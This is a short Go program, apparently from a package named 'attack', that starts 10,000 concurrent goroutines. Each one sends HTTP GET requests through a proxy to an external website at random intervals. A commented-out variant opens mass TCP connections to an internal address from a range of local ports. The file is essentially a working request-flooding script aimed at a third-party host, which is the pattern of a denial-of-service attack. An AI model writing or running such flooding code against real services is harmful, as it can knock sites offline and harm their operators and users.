package main

import (
	"demo/dfm-test/inter/attack/proxy"
	"demo/dfm-test/pkg/common/util"
	"fmt"
	"github.com/dipperin/go-ms-toolkit/json"
	"math/rand"
	"net"
	"sync"
	"time"
)

func TcpRst(i int, addr string, num int64, wg *sync.WaitGroup) error {
	fcc := wg.Done
	ta := net.TCPAddr{
		IP:   net.IPv4(172, 16, 10, 16),
		Port: 20000 + i,
	}
	dr := &net.Dialer{
		Timeout:   time.Second * 1,
		LocalAddr: &ta,
	}
	defer util.Catch("TcpRst")
	time.Sleep(time.Duration(num) * time.Millisecond)
	con, err := dr.Dial("tcp", addr)
	if err != nil {
		fmt.Println("Dial#err:", err.Error())
		// 	if _, ok := err.(*net.OpError); ok {
		// 		fmt.Println("ok")
		// 	}
		fcc()
		return err
	}
	defer con.Close()
	fcc()
	return nil
}

func HttpRst(cli *proxy.Proxy, url string, num int64, wg *sync.WaitGroup) error {
	var res interface{}
	err := cli.Get(url, "", &res)
	if err != nil {
		fmt.Println("Get#err:", err.Error())
		// if _, ok := err.(*url.Error); ok {
		// 	fmt.Println("ok")
		// }
		return err
	}
	fmt.Println("res:", json.StringifyJson(res))
	time.Sleep(time.Duration(num) * time.Millisecond)
	wg.Done()
	return nil
}

func main() {
	// addr := "172.16.10.24:3000"
	url := "https://www.qixxjutexx.com"
	ran := rand.New(rand.NewSource(time.Now().UnixNano()))
	wg := sync.WaitGroup{}
	// defer ci.SetCloseConnection(true)
	cli := proxy.NewProxy(url)
	wg.Add(10000)
	for i := 0; i < 10000; i++ {
		// go TcpRst(i, addr, ran.Int63n(1000)+1, &wg)
		go HttpRst(cli, "", ran.Int63n(1000)+1, &wg)
	}
	wg.Wait()
}
